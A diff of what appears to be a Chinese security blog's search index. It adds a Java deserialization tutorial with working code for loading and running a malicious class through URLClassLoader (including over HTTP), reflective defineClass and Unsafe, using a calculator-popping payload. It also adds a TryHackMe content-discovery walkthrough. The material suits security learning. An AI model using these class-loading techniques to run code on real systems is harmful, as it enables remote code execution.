@@ -2061,7 +2061,7 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>tryhackme</tag>
       </tags>
   </entry>
   <entry>
@@ -2349,7 +2349,7 @@
 </blockquote>
 <p>而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。</p>
 <p><img src="https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaBytes.png" alt="img"></p>
-<h4 id="42-类加载器的原理"><a href="#4-2-类加载器的原理" class="headerlink" title="4.2. 类加载器的原理"></a>4.2. 类加载器的原理</h4><p>根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。</p>
+<h4 id="42-类加载器底层原理分析"><a href="#4-2-类加载器底层原理分析" class="headerlink" title="4.2. 类加载器底层原理分析"></a>4.2. 类加载器底层原理分析</h4><p>根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。</p>
 <p><strong>示例如下：</strong></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>       <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<span class="hljs-comment">//一个 AppClassLoader</span><br><span class="hljs-comment">//       System.out.println(cl);</span><br>        <span class="hljs-type">Class</span>  <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> cl.loadClass(<span class="hljs-string">&quot;org.example.Person&quot;</span>);<br>        <span class="hljs-comment">//c.newInstance();</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -2415,6 +2415,67 @@
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230131170828115.png" alt="image-20230131170828115"></p>
 <p>defineClass1 是 native 方法，万物之源！就是从这完成了类的加载！！！</p>
 <p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230131170918230.png" alt="image-20230131170918230"></p>
+<h4 id="43-利用-urlclassloader-加载远程-class-文件"><a href="#4-3-利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="4.3. 利用 URLClassLoader 加载远程 class 文件"></a>4.3. 利用 URLClassLoader 加载远程 class 文件</h4><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 <code>Java </code>类加载器的工作流程。</p>
+<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找 <strong>.class</strong> 文件来加载，而这个基础路径有分为三种情况：</p>
+<p>①：URL 未以斜杠 &#x2F; 结尾，则认为是一个 JAR 文件，使用 <code>JarLoader</code> 来寻找类，即为在 Jar 包中寻找 <strong>.class</strong> 文件</p>
+<p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找 <strong>.class</strong> 文件</p>
+<p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p>
+<p>我们一个个看</p>
+<h5 id="431-file"><a href="#4-3-1-file" class="headerlink" title="4.3.1. file"></a>4.3.1. file</h5><p>我们在目录下新建一个 Calc.java 的文件。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 file 协议  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接着，点小锤子编译一下，我们会在 out 的 src 文件夹下发现编译过的 .class 文件。接着，我们进行一下复制的操作，将其复制到 E 盘。</p>
+<p>接着，我们编写 URLClassLoader 的启动类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 file 协议  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>  <br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功弹出了计算器</p>
+<h5 id="432-http"><a href="#4-3-2-http" class="headerlink" title="4.3.2. http"></a>4.3.2. http</h5><p>在 <code>Calc.class</code> 文件目录下执行 <code>python3 -m http.server 9999</code>，起一个 http 服务。我这里是 E 盘根目录，就在 E 盘起。</p>
+<p>接着，我们编写恶意利用类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 HTTP 协议  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/HTTPURLClassLoader.png" alt="img"></p>
+<h5 id="433-filejar-协议"><a href="#4-3-3-file-jar-协议" class="headerlink" title="4.3.3. file+jar 协议"></a>4.3.3. file+jar 协议</h5><p>先将我们之前的 class 文件打包一下，打包为 jar 文件。</p>
+<p>去到源 .class 文件下，别去复制的地方，运行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">jar -cvf Calc.jar Clac.class<br></code></pre></td></tr></table></figure>
+
+<p>接着，我们修改启动器，调用恶意类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 file + jarpublic class JarRce &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  <br> calc.newInstance();  <br>  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JarFileURLClassLoader.png" alt="img"></p>
+<h5 id="434-http-jar-协议"><a href="#4-3-4-HTTP-jar-协议" class="headerlink" title="4.3.4. HTTP + jar 协议"></a>4.3.4. HTTP + jar 协议</h5><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>成功弹出计算器</li>
+</ul>
+<p>最灵活的肯定是 http 协议的加载</p>
+<h4 id="44-利用-classloaderdefineclass-直接加载字节码"><a href="#4-4-利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="4.4. 利用 ClassLoader#defineClass 直接加载字节码"></a>4.4. 利用 ClassLoader#defineClass 直接加载字节码</h4><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaRun.png" alt="img"></p>
+<p>默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/DefineClass.png" alt="img"></p>
+<p>解释一下 <code>defineClass</code></p>
+<p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p>
+<p>因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 <code>defineClass()</code> 方法进行字节码的加载，然后实例化之后即可弹 shell</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.DefineClass;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// 利用 ClassLoader#defineClass 直接加载字节码  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>)); <span class="hljs-comment">// 字节码的数组  </span><br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) method.invoke(classLoader, <span class="hljs-string">&quot;src.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length);  <br> c.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>成功弹出计算器，如果报错的话，看一看 invoke 方法调用时的 “Calc” 位置是否正确。</li>
+</ul>
+<p>使用<code>ClassLoader#defineClass</code>直接加载字节码有个优点就是不需要出网也可以加载字节码，但是它也是有缺点的，就是需要设置<code>m.setAccessible(true);</code>，这在平常的反射中是无法调用的。</p>
+<p>在实际场景中，因为 <code>defineClass</code> 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
+<h4 id="45-unsafe-加载字节码"><a href="#4-5-Unsafe-加载字节码" class="headerlink" title="4.5. Unsafe 加载字节码"></a>4.5. Unsafe 加载字节码</h4><ul>
+<li>Unsafe中也存在<code>defineClass()</code>方法，本质上也是 <code>defineClass</code> 加载字节码的方式。</li>
+</ul>
+<p>跟进去看一看 <code>Unsafe</code> 的 <code>defineClass()</code> 方法</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9602-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/UnsafeClassLoader.png" alt="img"></p>
+<p>这里的 <code>Unsafe</code> 方法，是采用单例模式进行设计的，所以虽然是 public 方法，但无法直接调用，所以我们用反射来调用它。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.UnsafeClassLoader;  <br>  <br><span class="hljs-keyword">import</span> sun.misc.Unsafe;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeClassLoaderRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();  <br> Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);   <br> unsafeField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class,  <br> <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);  <br> <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>));  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="hljs-string">&quot;src.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length, classLoader, <span class="hljs-literal">null</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="五-总结"><a href="#五-总结" class="headerlink" title="五. 总结"></a>五. 总结</h3><ul>
+<li>首先我们要知道字节码与安全有什么关系，不是照着敲几行代码，看到弹出计算器就是可以的了，我们需要去分析原因，不然和安全研究没有半毛钱关系。</li>
+</ul>
+<p>我们要最终达到的目的其实是加载 class 文件，也就是字节码文件。所以我们所做的一系列工作都是为了能够调用这些 class，只有完成了这一步，才能继续我们的链子。</p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://segmentfault.com/a/1190000023876273">https://segmentfault.com/a/1190000023876273</a></p>
 ]]></content>
       <categories>
@@ -11940,6 +12001,63 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </categories>
       <tags>
         <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tryhackme渗透测试02</title>
+    <url>/2023/01/31/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>渗透测试 Content Discovery 篇章。</p>
+<span id="more"></span>
+
+<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h3><p>这一篇章主要是学会如何发现 web 服务器上隐藏的和私有的可能导致漏洞的内容&#x2F;信息，共计 12 个挑战。</p>
+<h3 id="二-挑战"><a href="#二-挑战" class="headerlink" title="二. 挑战"></a>二. 挑战</h3><h4 id="21-什么是内容发现"><a href="#2-1-什么是内容发现" class="headerlink" title="2.1 什么是内容发现"></a>2.1 什么是内容发现</h4><p>在讨论什么是内容发现之前，先说说在一个 web 应用程序的上下文环境中，什么是内容。</p>
+<p>内容可以是很多东西，比如说文件、视频、图片、备份文件、网站特征。内容发现就是要找到可能导致漏洞的信息。</p>
+<p>当我们在讨论内容发现的时候，我们不是在说我们能在网站上看到的明显的信息，而是那些没有直接展示给我们、预期不对公众展示的信息。</p>
+<p>如何进行内容发现呢？内容发现有三种常用的方法，它们分别是：</p>
+<ol>
+<li>手工</li>
+<li>自动</li>
+<li>OSINT 开源情报</li>
+</ol>
+<h4 id="22-手动发现之-robotstxt"><a href="#2-2-手动发现之-robots-txt" class="headerlink" title="2.2 手动发现之 robots.txt"></a>2.2 手动发现之 robots.txt</h4><p>robots.txt文件是一个文档，它告诉搜索引擎哪些页面可以显示在搜索引擎结果中，哪些页面不可以显示在搜索引擎结果中，或者禁止特定的搜索引擎完全抓取网站。通常的做法是限制某些网站区域，这样它们就不会显示在搜索引擎结果中。这些页面可能是针对网站客户的管理门户或文件等区域。这个文件给了我们一个网站上的位置列表，所有者不希望我们作为渗透测试人员发现这些位置。</p>
+<h4 id="23-手动发现之-favicon"><a href="#2-3-手动发现之-Favicon" class="headerlink" title="2.3 手动发现之 Favicon"></a>2.3 手动发现之 Favicon</h4><p>favicon是显示在浏览器地址栏或选项卡上的一个小图标，用于标记网站。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502/42a556740d021fc3e7111a689dcadb28.png" alt="img"></p>
+<p>有时，当使用框架构建一个网站时，作为安装的一部分的图标会被遗留下来，如果网站开发人员没有用自定义的图标替换它，那这可以让我们知道使用的是什么框架。OWASP 拥有一个通用框架图标的<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">数据库</a>，您可以使用它来检查目标图标。一旦我们了解了框架堆栈，我们就可以使用外部资源来发现更多关于它的信息(见下一节)。</p>
+<p><strong>实操</strong></p>
+<p>访问题目给的网址然后通过 curl 命令下载网站图标并获取其 md5 值，然后和 owasp 的数据库做对比来找出网站使用了什么框架。</p>
+<h4 id="24-手动发现之-sitemapxml"><a href="#2-4-手动发现之-Sitemap-xml" class="headerlink" title="2.4 手动发现之 Sitemap.xml"></a>2.4 手动发现之 Sitemap.xml</h4><p>不像robots.txt文件，它限制了搜索引擎爬虫可以查看的内容，sitemap.xml文件给出了网站所有者希望在搜索引擎上列出的每个文件的列表。这些页面有时会包含网站中一些比较难导航的区域，甚至会列出一些当前网站不再使用但仍在幕后工作的旧网页。</p>
+<h4 id="25-自动发现之-http-headers"><a href="#2-5-自动发现之-HTTP-Headers" class="headerlink" title="2.5 自动发现之 HTTP Headers"></a>2.5 自动发现之 HTTP Headers</h4><p>当我们向 web 服务器发出请求时，服务器会返回各种 HTTP 报头。这些标题有时会包含有用的信息，如web 服务器软件，可能使用的编程&#x2F;脚本语言。在下面的例子中，我们可以看到 web 服务器是 NGINX 版本1.18.0，PHP 版本 7.4.3。利用这些信息，我们可以找到正在使用的软件版本的漏洞。尝试在 web 服务器上运行下面的 curl 命令，其中 -v 开关启用详细模式，这将输出报头(可能会有一些有趣的东西!)</p>
+<h4 id="26-自动发现之-framework-stack"><a href="#2-6-自动发现之-Framework-Stack" class="headerlink" title="2.6 自动发现之 Framework Stack"></a>2.6 自动发现之 Framework Stack</h4><p>一旦你已确定一个网站的框架，例如通过上面的 favicon 或是 页面源中寻找线索。那你就可以找到框架的网站。从那里，我们可以了解更多关于软件和其他事物的信息，这可能导致我们可以发现更多的内容。</p>
+<p><strong>实操</strong></p>
+<p>访问题目给的网址，然后页面底部有个评论，评论里面有道框架的网站的链接，点进去看一下。</p>
+<p>这里面应该有个到框架的管理员门户网站的链接。</p>
+<h4 id="27-osint-google-hackingx2fdorking"><a href="#2-7-OSINT-Google-Hacking-x2F-Dorking" class="headerlink" title="2.7 OSINT Google Hacking&#x2F;Dorking"></a>2.7 OSINT Google Hacking&#x2F;Dorking</h4><p>还有一些外部资源可以帮助你发现目标网站的信息;这些资源通常被称为OSINT或(开源情报)，因为它们是免费的收集信息的工具:</p>
+<p><strong>Google Hacking &#x2F; Dorking</strong></p>
+<p>谷歌 hacking &#x2F; Dorking 利用谷歌的高级搜索引擎功能，允许您挑选自定义内容。举个例子，通过使用 <strong>site:</strong> 过滤器，可以挑选出来自特定域名的搜索结果。（比如 site: tryhackme.com）还可以在 site: xxx 过滤器后附加上一些关键字，这用来表明返回的搜索结果中要包含这个关键字。比如 ste:tryhackme.com admin 意思是返回来自于 tryhackme.com 这个域名并且内容中包含了 admin 关键字的网页。</p>
+<p>您也可以组合多个过滤器。下面是你可以使用的更多过滤器的例子:</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502/image-20230131204417984.png" alt="image-20230131204417984"></p>
+<blockquote>
+<p>关于 Google Hacking 的更多信息可以翻阅：<a href="https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</a></p>
+</blockquote>
+<h4 id="28-osint-wappalyzer"><a href="#2-8-OSINT-Wappalyzer" class="headerlink" title="2.8 OSINT Wappalyzer"></a>2.8 OSINT Wappalyzer</h4><p><strong>Wappalyzer</strong> (<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a>) 是一个在线工具和浏览器扩展，可以帮助识别网站使用的技术，如框架、内容管理系统(CMS)、支付处理器等等，甚至还可以找到版本号。</p>
+<h4 id="29-osint-wayback-machine"><a href="#2-9-OSINT-Wayback-Machine" class="headerlink" title="2.9 OSINT Wayback Machine"></a>2.9 OSINT Wayback Machine</h4><p>Wayback Machine (<a href="https://archive.org/web/">https://archive.org/web/</a>) 是一个网站的历史档案，可以追溯到90年代末。你可以搜索一个域名，它会显示该服务抓取网页并保存内容的所有时间。这项服务可以帮助发现可能仍然活跃在当前网站的旧页面。</p>
+<h4 id="210-osint-github"><a href="#2-10-OSINT-GitHub" class="headerlink" title="2.10 OSINT GitHub"></a>2.10 OSINT GitHub</h4><p>要理解 GitHub ，你首先需要理解 Git 。Git 是一个版本控制系统，用于跟踪项目中文件的更改。这使得团队工作更容易，因为您可以看到每个团队成员正在编辑什么以及他们对文件做了哪些更改。当用户完成更改时，他们将使用消息提交这些更改，然后将它们推回到中心位置(存储库)，以便其他用户将这些更改拉到本地计算机。GitHub 是 Git 在互联网上的托管版本。存储库可以设置为公共或私有，并具有各种访问控制。</p>
+<p>您可以使用 GitHub 的搜索功能来查找公司名称或网站名称，以尝试定位属于目标的存储库。一旦被发现，你就可以访问源代码、密码或其他你还没有发现的内容。</p>
+<h4 id="211-osint-s3-buckets"><a href="#2-11-OSINT-S3-Buckets" class="headerlink" title="2.11 OSINT S3 Buckets"></a>2.11 OSINT S3 Buckets</h4><p>S3 bucket是亚马逊AWS提供的一种存储服务，允许人们将文件甚至静态网站内容保存在通过HTTP和HTTPS访问的云中。文件的所有者可以设置访问权限，使文件公开、私有甚至可写。有时这些访问权限设置不正确，无意中允许访问不应该向公众提供的文件。</p>
+<p>S3 bucket 的格式是 http(s):&#x2F;&#x2F;{name}.s3.amazonaws.com，其中 {name} 由所有者决定，例如 tryhackme-assets.s3.amazonaws.com。S3存储桶可以通过多种方式被发现，比如在网站的页面源、GitHub 存储库中找到 url，甚至自动化这个过程。一种常用的自动化方法是使用公司名称后面跟着常用的术语，如 {name}-assets、{name}-www、{name}-public、{name}-private 等。</p>
+<h4 id="212-自动发现"><a href="#2-12-自动发现" class="headerlink" title="2.12 自动发现"></a>2.12 自动发现</h4><h5 id="2121-什么是自动发现"><a href="#2-12-1-什么是自动发现" class="headerlink" title="2.12.1 什么是自动发现"></a>2.12.1 什么是自动发现</h5><p>自动发现是使用工具而不是手动发现内容的过程。这个过程是自动化的，因为它通常包含数百、数千甚至数百万个到 web 服务器的请求。这些请求检查一个文件或目录是否存在于一个网站上，让我们访问我们以前不知道存在的资源。这个过程可以通过使用一个叫做单词列表（wordlists）的资源来实现。</p>
+<h5 id="2122-单词列表是什么"><a href="#2-12-2-单词列表是什么？" class="headerlink" title="2.12.2 单词列表是什么？"></a>2.12.2 单词列表是什么？</h5><p>单词列表只是包含一长串常用单词的文本文件;它们可以涵盖许多不同的用例。例如，密码单词列表将包含最常用的密码，而我们在本例中查找内容，因此需要一个包含最常用目录和文件名的列表。THM AttackBox上预装的一个很好的单词列表资源是 Daniel Miessler 管理的 <a href="https://github.com/danielmiessler/SecLists%E3%80%82">https://github.com/danielmiessler/SecLists。</a></p>
+<h5 id="2123-自动化工具"><a href="#2-12-3-自动化工具" class="headerlink" title="2.12.3 自动化工具"></a>2.12.3 自动化工具</h5><p>尽管有许多不同的内容发现工具可用，它们都有各自的特点和缺陷，但我们将介绍三个预先安装在攻击盒上的工具，ffuf, dirb和gobuster。</p>
+<p>在AttackBox上，针对Acme IT Support网站执行以下三个命令，并查看得到的结果。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502/image-20230131210747957.png" alt="image-20230131210747957"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>tryhackme</tag>
       </tags>
   </entry>
